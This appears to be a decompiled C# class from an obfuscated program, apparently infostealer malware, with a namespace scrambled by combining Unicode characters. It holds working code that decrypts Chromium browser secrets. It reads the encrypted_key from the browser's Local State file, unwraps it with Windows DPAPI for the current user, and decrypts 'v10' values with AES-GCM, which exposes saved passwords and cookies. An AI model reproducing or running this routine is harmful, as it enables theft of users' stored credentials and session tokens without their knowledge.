using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000025 RID: 37
	public class Class_25
	{
		// Token: 0x06000097 RID: 151 RVA: 0x00005218 File Offset: 0x00003418
		public static string lmethod_68(string str_0, string str_1)
		{
			string text = string.Empty;
			string result;
			try
			{
				if (str_0.StartsWith("v10"))
				{
					text = Class_25.pmethod_69(str_1, str_0);
					result = text;
				}
				else
				{
					text = Class_69.DecryptBlob(str_0, DataProtectionScope.CurrentUser, null).Trim();
					result = text;
				}
			}
			catch
			{
				result = text;
			}
			return result;
		}

		// Token: 0x06000098 RID: 152 RVA: 0x00005284 File Offset: 0x00003484
		private static string pmethod_69(string str_0, string str_1)
		{
			int num = 12;
			string text = "v10";
			string text2 = "DPAPI";
			string empty = string.Empty;
			string s = File.ReadAllText(str_0).FromJSON().tmethod_322("os_crypt").tmethod_322("encrypted_key").gmethod_333(false);
			string s2 = Encoding.Default.GetString(Convert.FromBase64String(s)).Substring(text2.Length);
			byte[] key = Class_69.DecryptBlob(Encoding.Default.GetBytes(s2), DataProtectionScope.CurrentUser, null);
			byte[] bytes = Encoding.Default.GetBytes(str_1.Substring(text.Length, num));
			return Class_28.Decrypt(Encoding.Default.GetBytes(str_1.Substring(num + text.Length)), key, bytes);
		}
	}
}
